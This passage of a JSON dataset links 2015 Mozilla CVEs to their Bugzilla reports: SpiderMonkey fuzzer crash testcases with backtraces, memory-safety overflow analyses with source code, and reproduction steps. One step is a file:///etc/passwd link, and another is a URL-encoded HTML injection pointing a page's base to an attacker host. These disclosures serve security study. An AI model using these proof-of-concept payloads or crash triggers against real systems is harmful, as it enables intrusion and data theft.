~/fuzzing/js/compileShell.py -b \"--32 --enable-debug --enable-profiling --enable-nspr-build --enable-more-deterministic --enable-arm-simulator -R ~/trees/mozilla-central\" -r ee093ca70666 autoBisect shows this is probably related to the following changeset: The first bad revision is: changeset: https://hg.mozilla.org/mozilla-central/rev/70a8168c7d24 user: Kannan Vijayan date: Thu Jan 15 20:11:21 2015 -0500 summary: Bug 1057082 - 3/7 - Modify jits to use lastProfilingFrame and lastProfilingCallSite fields. r=jandem Setting s-s by default because this involves the profiler, see bug 1124036 comment 4. Big thanks to Jesse for helping reduce this testcase. Kannan, is bug 1057082 a likely regressor?"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1155985",
        "title": "EXC_BAD_ACCESS in js`JS_GetClass(JSObject*) [inlined] JSObject::getClass(this=0x0000000104685200) const at jsobj.h:128",
        "description": "Derived from bug 891107 happened on 64bit cgc build, on OS X. Configure parameter: (compacting) --enable-optimize --enable-debug --enable-stdcxx-compat --enable-ctypes --disable-shared-js --enable-nspr-build Environment variable: JS_GC_ZEAL=14 Code: for (let i = 0; i < 1000; i++) { let test_struct = ctypes.StructType(\"test_struct\", [{ \"x\": ctypes.int32_t }, { \"bar\": ctypes.uint32_t }]); try { new test_struct(\"foo\", \"x\"); } catch (e) { } } Debug log: (lldb) run ~/Desktop/test.js Process 91361 launched: '/Users/arai/projects/mozilla-central/obj-sm-cgc/dist/bin/js' (x86_64) Process 91361 stopped * thread #1: tid = 0x99497c, 0x0000000100712244 js`JS_GetClass(JSObject*) [inlined] JSObject::getClass(this=0x0000000104685200) const at jsobj.h:128, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=2, address=0x104685200) frame #0: 0x0000000100712244 js`JS_GetClass(JSObject*) [inlined] JSObject::getClass(this=0x0000000104685200) const at jsobj.h:128 125 } 126 127 const js::Class* getClass() const { -> 128 return group_->clasp(); 129 } 130 const JSClass* getJSClass() const { 131 return Jsvalify(getClass()); (lldb) bt * thread #1: tid = 0x99497c, 0x0000000100712244 js`JS_GetClass(JSObject*) [inlined] JSObject::getClass(this=0x0000000104685200) const at jsobj.h:128, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=2, address=0x104685200) * frame #0: 0x0000000100712244 js`JS_GetClass(JSObject*) [inlined] JSObject::getClass(this=0x0000000104685200) const at jsobj.h:128 frame #1: 0x0000000100712244 js`JS_GetClass(JSObject*) [inlined] JSObject::getJSClass(this=0x0000000104685200) const at jsobj.h:131 frame #2: 0x0000000100712244 js`JS_GetClass(obj=0x0000000104685200) + 4 at jsapi.cpp:1769 frame #3: 0x000000010002f16e js`js::ctypes::CType::IsSizeDefined(JSObject*) [inlined] js::ctypes::CType::IsCType(obj=0x0000000104685200) + 5 at CTypes.cpp:3480 frame #4: 0x000000010002f169 js`js::ctypes::CType::IsSizeDefined(obj=0x0000000104685200) + 9 at CTypes.cpp:3609 frame #5: 0x0000000100032ef7 js`js::ctypes::ImplicitConvert(cx=0x0000000103088180, val=<unavailable>, targetType_=<unavailable>, buffer=0x0000000103031198, isArgument=false, freePointer=0x0000000000000000) + 87 at CTypes.cpp:2293 frame #6: 0x000000010003fe5a js`js::ctypes::CType::ConstructData(JSContext*, unsigned int, JS::Value*) + 260 at CTypes.cpp:5177 frame #7: 0x000000010003fd56 js`js::ctypes::CType::ConstructData(cx=0x0000000103088180, argc=2, vp=0x00000001048090b8) + 758 at CTypes.cpp:3249 frame #8: 0x00000001002531ba js`js::CallJSNativeConstructor(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) [inlined] js::CallJSNative(native=0x000000010003fa60)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) + 160 at jscntxtinlines.h:235 frame #9: 0x000000010025311a js`js::CallJSNativeConstructor(cx=0x0000000103088180, native=0x000000010003fa60, args=0x00007fff5fbfeb60)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) + 106 at jscntxtinlines.h:268 frame #10: 0x000000010022c330 js`js::InvokeConstructor(cx=0x0000000103088180, args=CallArgs at 0x00007fff5fbfeb60) + 160 at Interpreter.cpp:821 frame #11: 0x00000001002222e8 js`Interpret(cx=0x0000000103088180, state=0x00007fff5fbff278) + 45864 at Interpreter.cpp:2953 frame #12: 0x0000000100216f8f js`js::RunScript(cx=0x0000000103088180, state=0x00007fff5fbff278) + 335 at Interpreter.cpp:677 frame #13: 0x000000010022d017 js`js::ExecuteKernel(cx=0x0000000103088180, script=<unavailable>, scopeChainArg=0x00000001046742e0, thisv=0x00007fff5fbff388, type=EXECUTE_GLOBAL, evalInFrame=<unavailable>, result=<unavailable>) + 1383 at Interpreter.cpp:902 frame #14: 0x000000010022d36f js`js::Execute(cx=0x0000000103088180, script=<unavailable>, scopeChainArg=<unavailable>, rval=0x0000000000000000) + 431 at Interpreter.cpp:941 frame #15: 0x000000010071a549 js`ExecuteScript(cx=0x0000000103088180, obj=<unavailable>, scriptArg=<unavailable>, rval=0x0000000000000000) + 505 at jsapi.cpp:4133 frame #16: 0x0000000100007f9a js`Process(JSContext*, char const*, bool) [inlined] RunFile(JSContext*, char const*, __sFILE*, bool) + 464 at js.cpp:467 frame #17: 0x0000000100007dca js`Process(cx=0x0000000103088180, filename=<unavailable>, forceTTY=<unavailable>) + 1866 at js.cpp:597 frame #18: 0x0000000100004f9b js`main + 64 at js.cpp:5789 frame #19: 0x0000000100004f5b js`main [inlined] Shell(JSContext*, js::cli::OptionParser*, char**) + 348 at js.cpp:6055 frame #20: 0x0000000100004dff js`main(argc=<unavailable>, argv=<unavailable>, envp=<unavailable>) + 15951 at js.cpp:6376 frame #21: 0x0000000100000fa4 js`start + 52 I guess this is same bug as following, in bug 891107 comment #28: https://treeherder.mozilla.org/logviewer.html#?job_id=9001639&repo=mozilla-inbound"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1145781",
        "title": "Assertion failure: hasScript(), at js/src/shell/../jsfun.h:322 with Debugger",
        "description": "The following testcase crashes on mozilla-central revision 4d2d97b3ba34 (build with --enable-optimize --enable-posix-nspr-emulation --enable-valgrind --enable-gczeal --disable-tests --enable-debug, run with --fuzzing-safe --thread-count=2): gczeal(2); var g = newGlobal(); g.eval('function f() { return \"from f\"; }'); var dbg = new Debugger; var gw = dbg.makeGlobalObjectReference(g); var fw = gw.getOwnPropertyDescriptor('f').value; newGlobal(dbg.g, false); dbg.addDebuggee(g); var fenv = fw.environment; Backtrace: Program received signal SIGSEGV, Segmentation fault. 0x00000000004056d8 in JSFunction::nonLazyScript (this=<optimized out>) at js/src/shell/../jsfun.h:322 #0 0x00000000004056d8 in JSFunction::nonLazyScript (this=<optimized out>) at js/src/shell/../jsfun.h:322 #1 0x000000000046eb4a in JSFunction::nonLazyScript (this=<optimized out>) at js/src/shell/../jsfun.h:325 #2 0x00000000006b8c85 in js::GetDebugScopeForFunction (cx=cx@entry=0x1a19ee0, fun=..., fun@entry=...) at js/src/vm/ScopeObject.cpp:2478 #3 0x000000000061e815 in DebuggerObject_getEnvironment (cx=0x1a19ee0, argc=<optimized out>, vp=<optimized out>) at js/src/vm/Debugger.cpp:6650 #4 0x0000000000642d92 in js::CallJSNative (cx=0x1a19ee0, native=0x61e600 <DebuggerObject_getEnvironment(JSContext*, unsigned int, JS::Value*)>, args=...) at js/src/jscntxtinlines.h:235 #5 0x0000000000631ee3 in js::Invoke (cx=cx@entry=0x1a19ee0, args=..., construct=construct@entry=js::NO_CONSTRUCT) at js/src/vm/Interpreter.cpp:502 #6 0x00000000006339a3 in js::Invoke (cx=cx@entry=0x1a19ee0, thisv=..., fval=..., argc=argc@entry=0, argv=argv@entry=0x0, rval=..., rval@entry=...) at js/src/vm/Interpreter.cpp:558 #7 0x00000000006374da in js::InvokeGetterOrSetter (cx=cx@entry=0x1a19ee0, obj=0x7ffff5463160, fval=..., argc=argc@entry=0, argv=argv@entry=0x0, rval=rval@entry=...) at js/src/vm/Interpreter.cpp:628 #8 0x000000000069c213 in CallGetter (vp=..., shape=..., receiver=..., cx=0x1a19ee0) at js/src/vm/NativeObject.cpp:1614 #9 GetExistingProperty<(js::AllowGC)1> (cx=0x1a19ee0, receiver=..., obj=..., shape=..., vp=...) at js/src/vm/NativeObject.cpp:1664 #10 0x000000000069c71a in NativeGetPropertyInline<(js::AllowGC)1> (cx=0x1a19ee0, obj=..., receiver=..., id=..., nameLookup=nameLookup@entry=NotNameLookup, vp=...) at js/src/vm/NativeObject.cpp:1878 #11 0x000000000069cbe0 in js::NativeGetProperty (cx=<optimized out>, obj=..., receiver=..., id=..., vp=...) at js/src/vm/NativeObject.cpp:1912 #12 0x00000000004c26e0 in js::GetProperty (cx=<optimized out>, obj=..., receiver=..., id=..., vp=...) at js/src/vm/NativeObject.h:1434 #13 0x000000000062580f in GetPropertyOperation (vp=..., lval=..., pc=<optimized out>, script=..., fp=<optimized out>, cx=0x1a19ee0) at js/src/vm/Interpreter.cpp:260 #14 Interpret (cx=cx@entry=0x1a19ee0, state=...) at js/src/vm/Interpreter.cpp:2417 #15 0x0000000000631c48 in js::RunScript (cx=cx@entry=0x1a19ee0, state=...) at js/src/vm/Interpreter.cpp:452 #16 0x0000000000638b49 in js::ExecuteKernel (cx=cx@entry=0x1a19ee0, script=..., script@entry=..., scopeChainArg=..., thisv=..., type=type@entry=js::EXECUTE_GLOBAL, evalInFrame=evalInFrame@entry=..., result=result@entry=0x0) at js/src/vm/Interpreter.cpp:655 #17 0x000000000063acd0 in js::Execute (cx=cx@entry=0x1a19ee0, script=script@entry=..., scopeChainArg=..., rval=rval@entry=0x0) at js/src/vm/Interpreter.cpp:695 #18 0x0000000000a17717 in ExecuteScript (cx=cx@entry=0x1a19ee0, obj=..., scriptArg=..., rval=rval@entry=0x0) at js/src/jsapi.cpp:4091 #19 0x0000000000a1784b in JS_ExecuteScript (cx=cx@entry=0x1a19ee0, scriptArg=..., scriptArg@entry=...) at js/src/jsapi.cpp:4113 #20 0x0000000000406887 in RunFile (compileOnly=false, file=0x1a8a5a0, filename=0x7fffffffdf72 \"min.js\", cx=0x1a19ee0) at js/src/shell/js.cpp:466 #21 Process (cx=cx@entry=0x1a19ee0, filename=0x7fffffffdf72 \"min.js\", forceTTY=forceTTY@entry=false) at js/src/shell/js.cpp:597 #22 0x0000000000453b22 in ProcessArgs (op=0x7fffffffda00, cx=0x1a19ee0) at js/src/shell/js.cpp:5738 #23 Shell (envp=<optimized out>, op=0x7fffffffda00, cx=0x1a19ee0) at js/src/shell/js.cpp:6004 #24 main (argc=<optimized out>, argv=<optimized out>, envp=<optimized out>) at js/src/shell/js.cpp:6346 rax 0x0 0 rbx 0x1a19ee0 27369184 rcx 0x7ffff6ca53cd 140737333842893 rdx 0x0 0 rsi 0x7ffff6f7a9d0 140737336814032 rdi 0x7ffff6f791c0 140737336807872 rbp 0x7fffffffc120 140737488339232 rsp 0x7fffffffc120 140737488339232 r8 0x7ffff7fe0780 140737354008448 r9 0x6372732f736a2f6c 7165916604736876396 r10 0x7fffffffbee0 140737488338656 r11 0x7ffff6c27960 140737333328224 r12 0x7fffffffc280 140737488339584 r13 0x7fffffffc150 140737488339280 r14 0x19d5380 27087744 r15 0x7fffffffc270 140737488339568 rip 0x4056d8 <JSFunction::nonLazyScript() const+28> => 0x4056d8 <JSFunction::nonLazyScript() const+28>: movl $0x142,0x0 0x4056e3 <JSFunction::nonLazyScript() const+39>: callq 0x4046a0 <abort@plt> Marking s-s because gczeal is involved. Might only affect the debugger though."
      }
    ],
    "CVE-2015-2727": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1163422",
        "title": "Middle-click opens file: links from http:",
        "description": "User Agent: Mozilla/5.0 (X11; Linux i686 (x86_64)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Steps to reproduce: 1. navigate to an http site with the following HTML: <a href=\"file:///etc/passwd\">clickme</a> 2. middle-click the link dveditz says that this doesn't happen on 37.0.2. Actual results: file:///etc/passwd opened in a new tab Expected results: nothing should have happened, just like when the link gets left-clicked or \"open link in new tab\" is selected in the context menu"
      }
    ],
    "CVE-2015-2729": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1122218",
        "title": "Out-of-Bounds Read in AudioParamTimeline::AudioNodeInputValue",
        "description": "The asan report was generated with this build: https://ftp.mozilla.org/pub/mozilla.org/firefox/tinderbox-builds/mozilla-central-linux64-asan/1421077535/firefox-37.0a1.en-US.linux-x86_64-asan.tar.bz2 Asan Log: ==32128==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6160008fd890 at pc 0x7f298eb25e71 bp 0x7f2934856310 sp 0x7f2934856308 READ of size 4 at 0x6160008fd890 thread T69 (threaded-ml) #0 0x7f298eb25e70 in AudioNodeInputValue /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/media/webaudio/AudioParam.cpp:139 #1 0x7f298eb6a48c in GetValueAtTime<long> /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/media/webaudio/AudioParamTimeline.h:93 #2 0x7f298eb69c53 in ComputeCustom /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/media/webaudio/OscillatorNode.cpp:243 #3 0x7f298eb232df in ProcessInput /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/media/webaudio/AudioNodeStream.cpp:492 #4 0x7f298e9b4016 in ProduceDataForStreamsBlockByBlock /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/media/MediaStreamGraph.cpp:1229 ..."
      }
    ],
    "CVE-2015-2730": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1125025",
        "title": "ECC correctness issues",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36 Steps to reproduce: Examined source code Actual results: Incorrect double scalar multiplication algorithm Expected results: Implementation should have been correct and efficient. Implementation of ECC multiplication for ECDSA signature validation doesn't handle exceptional cases correctly: an attacker may be able to exploit this to forge signatures. In detail, the formulas appearing in ecp_jac.c do not handle the case when the addition produces infinity or adds a point to itself. An attacker can use this to generate specially-crafted signatures that cause the validation algorithm to compute the incorrect point. It isn't clear if this can be used to forge signatures. ECDSA verification must use formulas that handle all possible cases, unlike single-point exponentiation where detailed analysis can remove this issue."
      }
    ],
    "CVE-2015-2739": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1168207",
        "title": "Memory safety problem in ArrayBufferBuilder::append",
        "description": "User Agent: Mozilla/5.0 (Windows; rv:***) Gecko/20100101 Firefox/**.* Build ID: 20150305021524 Steps to reproduce: ArrayBufferBuilder::append (in dom\\base\\nsXMLHttpRequest.cpp) can overwrite memory it does not own if aDataLen is very large. For example, assume that mLength=2, aDataLen=0xffffffff, and mCapacity=2. In this case, the LHS on line 4019 overflows, giving the value 1. Control then skips to line 4047 (assume a release build), which copies aDataLen bytes from aNewData all over Firefox's address space. Presumably this eventually will cause an access-violation crash on 32-bit platforms, but perhaps not before some other thread uses the written data to do something undesirable. On 64-bit platforms, execution might continue for a long time, depending upon how address space is laid out. I don't know, however, whether ArrayBufferBuilder::append is exposed to external content in such a way that this defect can be exploited. I suppose that a server could send back a defective XMLHttpRequest containing a very large length, though perhaps other code checks for this problem. 4013: bool 4014: ArrayBufferBuilder::append(const uint8_t *aNewData, uint32_t aDataLen, 4015: uint32_t aMaxGrowth) 4016: { 4017: MOZ_ASSERT(!mMapPtr); 4018: 4019: if (mLength + aDataLen > mCapacity) { 4020: uint32_t newcap; 4021: // Double while under aMaxGrowth or if not specified. 4022: if (!aMaxGrowth || mCapacity < aMaxGrowth) { 4023: newcap = mCapacity * 2; 4024: } else { 4025: newcap = mCapacity + aMaxGrowth; 4026: } 4027: 4028: // But make sure there's always enough to satisfy our request. 4029: if (newcap < mLength + aDataLen) { 4030: newcap = mLength + aDataLen; 4031: } 4032: 4033: // Did we overflow? 4034: if (newcap < mCapacity) { 4035: return false; 4036: } 4037: 4038: if (!setCapacity(newcap)) { 4039: return false; 4040: } 4041: } 4042: 4043: // Assert that the region isn't overlapping so we can memcpy. 4044: MOZ_ASSERT(!areOverlappingRegions(aNewData, aDataLen, mDataPtr + mLength, 4045: aDataLen)); 4046: 4047: memcpy(mDataPtr + mLength, aNewData, aDataLen); 4048: mLength += aDataLen; 4049: 4050: return true; 4051: }"
      }
    ],
    "CVE-2015-2740": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1170809",
        "title": "Overflow in nsXMLHttpRequest::AppendToResponseText causes memory-safety bug",
        "description": "User Agent: Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0 Build ID: 20150305021524 Steps to reproduce: nsXMLHttpRequest::AppendToResponseText (38.0.1\\dom\\base\\nsXMLHttpRequest.cpp) can write to memory that it does not own: 665: nsresult 666: nsXMLHttpRequest::AppendToResponseText(const char * aSrcBuffer, 667: uint32_t aSrcBufferLen) 668: { 669: NS_ENSURE_STATE(mDecoder); 670: 671: int32_t destBufferLen; 672: nsresult rv = mDecoder->GetMaxLength(aSrcBuffer, aSrcBufferLen, 673: &destBufferLen); 674: NS_ENSURE_SUCCESS(rv, rv); 675: 676: if (!mResponseText.SetCapacity(mResponseText.Length() + destBufferLen, fallible)) { 677: return NS_ERROR_OUT_OF_MEMORY; 678: } 679: 680: char16_t* destBuffer = mResponseText.BeginWriting() + mResponseText.Length(); 681: 682: int32_t totalChars = mResponseText.Length(); 683: 684: // This code here is basically a copy of a similar thing in 685: // nsScanner::Append(const char* aBuffer, uint32_t aLen). 686: int32_t srclen = (int32_t)aSrcBufferLen; 687: int32_t destlen = (int32_t)destBufferLen; 688: rv = mDecoder->Convert(aSrcBuffer, 689: &srclen, 690: destBuffer, 691: &destlen); 692: ... The bug is in line 676. If mResponseText.Length() + destBufferLen overflows, line 676 will SetCapacity to a value smaller than mResponseText's current length. The remaining code will then write data beginning at the _end_ of the buffer (mResponseText.BeginWriting() + mResponseText.Length()). Since the response text from an XMLHttpRequest is under external control, this bug could be leveraged to corrupt Firefox's address space, possibly causing execution of attacker-chosen code. Presumably this problem can occur only under 64-bit OSes."
      }
    ],
    "CVE-2015-2741": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1147497",
        "title": "key pinning checks for overridable errors do not work as intended by default",
        "description": "In bug 1066190, we discovered that encountering an overridable certificate error could cause pinning checks to be skipped. So, if building a trusted chain failed in CertVerifier::VerifyCert, we made sure that we called CertListContainsExpectedKeys to do pinning checks. CertListContainsExpectedKeys expects a chain of certificates ending in a trusted root. The default pinning setting is to skip the checks if the root isn't a built-in root. In VerifyCert, if building a chain failed, we don't have a chain - we just pass the certificate itself to CertListContainsExpectedKeys. This does the built-in root check on that certificate, which almost certainly won't be a built-in. So, we skip the pinning checks and use the original error, which would allow overrides."
      }
    ],
    "CVE-2015-2742": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1138669",
        "title": "Some mac crash reports include private information",
        "description": "I'm working on bug 1124408 and the crash reports I'm viewing contain private information. The bug is about a crash when using some password fields (like the password manager). In the crash report, actual keys that the user pressed when they got the crash are plainly visible. For example: https://crash-stats.mozilla.com/report/index/5f846d1b-cff1-455d-86dc-6dd4e2150301 From the AppNotes section, I can see that this user has a 'k' in their password. This information is valuable to the bug but also clearly private. I don't know the policy here but I suspect this info should be removed from the report. The message is logged from the Cocoa widget object."
      }
    ],
    "CVE-2015-2744": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1102204",
        "title": "Remote HTML tag injection in Gaia Search app",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.10 Safari/537.36 Steps to reproduce: 1. Start Firefox OS 2.1/2.2. 2. Open Search(Browser) app and launch following link. http://alice.csrf.jp/http.php?s=308&u=https://www.google.co.jp/search?q=%3Ciframe+mozbrowser+remote+mozapp%3D%22app%3A%2F%2Ffm.gaiamobile.org%2Fmanifest.webapp%22+src%3D%22app%3A%2F%2Ffm.gaiamobile.org%2Findex.html%22%3E 3. Search app. shows the search result of <iframe...> 4. Push HOME button and show home screen 5. Click \"Browser\" icon and launch Search app again Actual results: The built-in FM Radio app. is shown on the Search app. (see attached image) Expected results: FM Radio app. is not shown and a simple text \"<iframe mozbrowser ...\" is shown on the Search app."
      }
    ],
    "CVE-2015-2745": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1101158",
        "title": "Remote HTML tag injection in Gaia System app",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.6 Safari/537.36 Steps to reproduce: 1. Start Firefox OS 2.2 simulator from app-manager. 2. Open Browser app and launch following link. http://alice.csrf.jp/http.php?s=308&u=https://www.google.co.jp/search?q=%3Cbase+href%3D%22http%3A%2F%2Fmallory.csrf.jp%2Ffake%2F%22%3E 3. Browser shows the search result of <base href=\"...\"> 4. Push HOME button and return to home screen 5. Long push HOME button and close Browser app window by 'x' button on the screen 6. Open Settings app and choose Find My Device 7. If a user doesn't enable the function, \"Create account or sign in\" button is shown on the screen. 8. Click the \"Create account or sign in\" button Actual results: http://mallory.csrf.jp/fxa/fxa_module.html is shown instead of legitimate Firefox account creation page. Expected results: /fxa/fxa_module.html in the application is shown."
      }
    ],
    "CVE-2015-4000": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1138554",
        "title": "NSS accepts export-length DHE keys with regular DHE cipher suites (\"Logjam\")",
        "description": "No description provided."
      }
    ],
    "CVE-2015-4473": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1178890",
        "title": "TimerThread::DoAfterSleep() seems to not be threadsafe",
        "description": "TimerThread::DoAfterSleep() iterates over mTimers without any locking, updating timeouts. Any insertions of new timers (or canceling/rescheduling) is likely to go awry if DoAfterSleep is running. I need to verify that this function is ever called, since dxr doesn't seem to know about any callers."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1146213",
        "title": "Crash [@ js::NativeObject::setSlot] with off-thread compilation",
        "description": "The following testcase crashes on mozilla-central revision b8e628af0b5c (build with --enable-optimize --enable-posix-nspr-emulation --enable-valgrind --enable-gczeal --disable-tests --disable-debug, run with --fuzzing-safe --thread-count=2): setGCCallback({ action: \"majorGC\", }); schedulegc(this) gcslice(3) var lfGlobal = newGlobal(); lfGlobal.offThreadCompileScript(\"\"); lfGlobal.runOffThreadScript(); Backtrace: Program received signal SIGSEGV, Segmentation fault. js::NativeObject::setSlot (this=0x4b4b4b4b4b4b4b4b, slot=1, value=...) at js/src/vm/NativeObject.h:785 #0 js::NativeObject::setSlot (this=0x4b4b4b4b4b4b4b4b, slot=1, value=...) at js/src/vm/NativeObject.h:785 #1 0x0000000000894375 in setReservedSlot (v=..., index=1, this=<optimized out>) at js/src/vm/NativeObject.h:851 #2 js::ScriptSourceObject::initFromOptions (cx=cx@entry=0x17376c0, source=..., source@entry=..., options=...) at js/src/jsscript.cpp:1388 #3 0x0000000000529599 in js::ParseTask::finish (this=this@entry=0x1810600, cx=cx@entry=0x17376c0) at js/src/vm/HelperThreads.cpp:240 #4 0x0000000000567eaf in js::GlobalHelperThreadState::finishParseTask (this=<optimized out>, maybecx=maybecx@entry=0x17376c0, rt=rt@entry=0x1715260, token=token@entry=0x1810600) at js/src/vm/HelperThreads.cpp:938 #5 0x0000000000833094 in JS::FinishOffThreadScript (maybecx=maybecx@entry=0x17376c0, rt=rt@entry=0x1715260, token=token@entry=0x1810600) at js/src/jsapi.cpp:3854 #6 0x000000000041b58c in runOffThreadScript (cx=cx@entry=0x17376c0, argc=<optimized out>, vp=0x7fffffffc2a8) at js/src/shell/js.cpp:3552 #7 0x000000000055d175 in CallJSNative (args=..., native=0x41b4f0 <runOffThreadScript(JSContext*, unsigned int, jsval*)>, cx=0x17376c0) at js/src/jscntxtinlines.h:235 #8 js::Invoke (cx=cx@entry=0x17376c0, args=..., construct=construct@entry=js::NO_CONSTRUCT) at js/src/vm/Interpreter.cpp:502 #9 0x000000000055e56a in js::Invoke (cx=cx@entry=0x17376c0, thisv=..., fval=..., argc=0, argv=<optimized out>, rval=...) at js/src/vm/Interpreter.cpp:558 #10 0x00000000008e7495 in js::DirectProxyHandler::call (this=this@entry=0x16f70c0 <js::CrossCompartmentWrapper::singleton>, cx=cx@entry=0x17376c0, proxy=..., proxy@entry=..., args=...) at js/src/proxy/DirectProxyHandler.cpp:77 #11 0x00000000008f38f1 in js::CrossCompartmentWrapper::call (this=0x16f70c0 <js::CrossCompartmentWrapper::singleton>, cx=0x17376c0, wrapper=..., args=...) at js/src/proxy/CrossCompartmentWrapper.cpp:288 #12 0x0000000000908ee7 in js::Proxy::call (cx=cx@entry=0x17376c0, proxy=proxy@entry=..., args=...) at js/src/proxy/Proxy.cpp:391 #13 0x0000000000908fca in js::proxy_Call (cx=cx@entry=0x17376c0, argc=<optimized out>, vp=<optimized out>) at js/src/proxy/Proxy.cpp:703 #14 0x000000000055d330 in CallJSNative (args=..., native=0x908f80 <js::proxy_Call(JSContext*, unsigned int, JS::Value*)>, cx=0x17376c0) at js/src/jscntxtinlines.h:235 #15 js::Invoke (cx=0x17376c0, args=..., construct=js::NO_CONSTRUCT) at js/src/vm/Interpreter.cpp:495 #16 0x000000000055808d in Interpret (cx=0x17376c0, state=...) at js/src/vm/Interpreter.cpp:2600 #17 0x000000000055ce7d in js::RunScript (cx=cx@entry=0x17376c0, state=...) at js/src/vm/Interpreter.cpp:452 #18 0x0000000000562bb0 in js::ExecuteKernel (cx=cx@entry=0x17376c0, script=script@entry=..., scopeChainArg=..., thisv=..., type=type@entry=js::EXECUTE_GLOBAL, evalInFrame=..., evalInFrame@entry=..., result=result@entry=0x0) at js/src/vm/Interpreter.cpp:655 #19 0x00000000005647ec in js::Execute (cx=cx@entry=0x17376c0, script=script@entry=..., scopeChainArg=..., rval=rval@entry=0x0) at js/src/vm/Interpreter.cpp:695 #20 0x0000000000832b73 in ExecuteScript (cx=cx@entry=0x17376c0, obj=..., scriptArg=..., rval=rval@entry=0x0) at js/src/jsapi.cpp:4091 #21 0x0000000000832bf6 in JS_ExecuteScript (cx=cx@entry=0x17376c0, scriptArg=..., scriptArg@entry=...) at js/src/jsapi.cpp:4113 #22 0x00000000004059e5 in RunFile (compileOnly=false, file=0x180cf00, filename=<optimized out>, cx=0x17376c0) at js/src/shell/js.cpp:466 #23 Process (cx=cx@entry=0x17376c0, filename=<optimized out>, forceTTY=forceTTY@entry=false) at js/src/shell/js.cpp:597 #24 0x00000000004133e6 in ProcessArgs (op=0x7fffffffd9b0, cx=0x17376c0) at js/src/shell/js.cpp:5738 #25 Shell (envp=<optimized out>, op=0x7fffffffd9b0, cx=0x17376c0) at js/src/shell/js.cpp:6004 #26 main (argc=<optimized out>, argv=<optimized out>, envp=<optimized out>) at js/src/shell/js.cpp:6346 rax 0x7fffffffb8f0 140737488337136 rbx 0x17376c0 24344256 rcx 0x17376c0 24344256 rdx 0x7fffffffb850 140737488336976 rsi 0x1 1 rdi 0x4b4b4b4b4b4b4b4b 5425512962855750475 rbp 0x4b4b4b4b4b4b4b4b 5425512962855750475 rsp 0x7fffffffb7e0 140737488336864 r8 0x180ff98 25231256 r9 0x5c 92 r10 0x7ffff5671000 140737310560256 r11 0x0 0 r12 0x1 1 r13 0x7fffffffb840 140737488336960 r14 0x7fffffffb850 140737488336976 r15 0x0 0 rip 0x43f3a5 <js::NativeObject::setSlot(unsigned int, JS::Value const&)+21> => 0x43f3a5 <js::NativeObject::setSlot(unsigned int, JS::Value const&)+21>: mov 0x8(%rdi),%rax 0x43f3a9 <js::NativeObject::setSlot(unsigned int, JS::Value const&)+25>: mov 0x10(%rax),%eax Marking s-s because this looks like a use-after-free."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1182711",
        "title": "Crash [@ js::ScopeIter::operator++] or Assertion failure: ssi_.type() == StaticScopeIter<CanGC>::Function, at vm/ScopeObject.cpp",
        "description": "for (var a of [0]) {} (function() { for (let b of [0]) { for (var c of null) { return; function f() {} } } })() asserts js debug shell on m-c changeset 7ec3e4b2a45f with --fuzzing-safe --no-threads --ion-eager at Assertion failure: ssi_.type() == StaticScopeIter<CanGC>::Function, at vm/ScopeObject.cpp and crashes opt shells at js::ScopeIter::operator++. Debug configure options: CC=\"clang -Qunused-arguments\" CXX=\"clang++ -Qunused-arguments\" AR=ar AUTOCONF=/usr/local/Cellar/autoconf213/2.13/bin/autoconf213 sh /Users/skywalker/trees/mozilla-central/js/src/configure --target=x86_64-apple-darwin12.5.0 --enable-debug --enable-nspr-build --enable-more-deterministic --with-ccache --enable-gczeal --enable-debug-symbols --disable-tests python -u ~/funfuzz/js/compileShell.py -b \"--enable-debug --enable-more-deterministic --enable-nspr-build\" -r 7ec3e4b2a45f Opt configure options: CC=\"clang -Qunused-arguments\" CXX=\"clang++ -Qunused-arguments\" AR=ar AUTOCONF=/usr/local/Cellar/autoconf213/2.13/bin/autoconf213 sh /Users/skywalker/trees/mozilla-central/js/src/configure --target=x86_64-apple-darwin12.5.0 --disable-debug --enable-nspr-build --enable-more-deterministic --with-ccache --enable-gczeal --enable-debug-symbols --disable-tests python -u ~/funfuzz/js/compileShell.py -b \"--disable-debug --enable-more-deterministic --enable-nspr-build\" -r 7ec3e4b2a45f A bisection window is coming up. :bz, :jorendorff and :shu landed stuff in the window so setting needinfo? from Boris as a start. Setting s-s to be safe, this may merely be a null deref. Please feel free to open it up if it is not s-s."
      }
